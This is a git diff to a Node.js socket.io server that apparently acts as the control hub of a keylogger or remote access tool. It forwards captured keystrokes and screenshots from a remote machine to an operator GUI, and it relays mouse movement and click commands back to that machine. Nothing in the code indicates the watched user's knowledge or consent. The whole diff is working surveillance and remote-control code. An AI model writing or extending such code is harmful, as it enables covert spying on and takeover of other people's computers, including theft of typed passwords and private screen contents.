@@ -29,6 +29,7 @@ app.use(bodyParser.urlencoded({
 app.use(cookieParser());
 
 let guiSocketId;
+let remoteSocketId;
 
 io.on('connection', function(socket){
 
@@ -39,6 +40,43 @@ io.on('connection', function(socket){
 
   socket.emit('init', {'msg':'start again'});
 
+
+  socket.on('screenshot_taken', (data) => {
+ 	
+  	let base64Image = data.image.split("b'").pop();
+  	//base64Image.data.image.split().pop()
+  	console.log(base64Image)
+ //  	fs.writeFile('image.png', base64Image, {encoding: 'base64'}, function(err) {
+ //    	console.log('File created');
+
+	// });
+
+  	io.sockets.to(guiSocketId).emit('screenshot_send', base64Image);
+  })
+
+  socket.on('screenshot', (data) => {
+  	 io.sockets.to(remoteSocketId).emit('screenshot');
+  })
+
+  socket.on('message', (data) => {
+  	remoteSocketId = socket.id
+  })
+
+  socket.on('mouseControl', (data) => {
+  	let x = data.x
+  	let y = data.y
+
+  	console.log(data)
+
+  
+  	io.sockets.to(remoteSocketId).emit('mouse', {x:x, y:y});
+  })
+
+  socket.on('mouseLeftClick', (data) => {
+  	console.log('clicked left')
+  	io.sockets.to(remoteSocketId).emit('mouseLeftClick');
+  })
+
   console.log('a user connected', socket.id);
 
   socket.on('keyLog', (data) => {
@@ -46,6 +84,13 @@ io.on('connection', function(socket){
   	console.log('sending to gui remote... id: ', guiSocketId)
   	io.sockets.to(guiSocketId).emit('keystrokes', data);
   })
+
+
+  setInterval(() => {
+  	if (remoteSocketId) {
+  	    io.sockets.to(guiSocketId).emit('remoteConnected');
+  	}
+  }, 1000)
 });
 
 
